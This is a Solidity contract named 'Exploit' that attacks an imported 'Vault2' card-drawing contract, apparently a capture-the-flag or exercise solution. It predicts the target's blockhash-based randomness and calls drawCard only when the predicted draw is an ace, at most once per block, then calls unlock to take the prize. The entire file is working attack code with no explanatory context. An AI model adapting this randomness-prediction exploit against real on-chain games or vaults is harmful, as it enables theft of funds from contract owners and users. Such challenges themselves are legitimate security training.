// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Vault2.sol";

contract Exploit {
    Vault2 inst;
    uint256 internal lastBlock;
    constructor(address vault2) {
        inst = Vault2(vault2);  
    }
    function shouldDraw() external payable{
        uint256 bn1 = uint256(blockhash(block.number - 1));
        uint256 bn2 = uint256(blockhash(block.number));
        uint8 fin = uint8(((bn1) ^ (bn2)) % 52);
        require(fin % 13 == 0 && lastBlock != block.number);
        lastBlock = block.number;
        inst.drawCard{value: msg.value}();
    
    }
    function getacesInRows() external view returns (uint8) {
        return inst.acesInRow();
    }
    function unlock() external payable {
        inst.unlock{value: msg.value}();
    }
}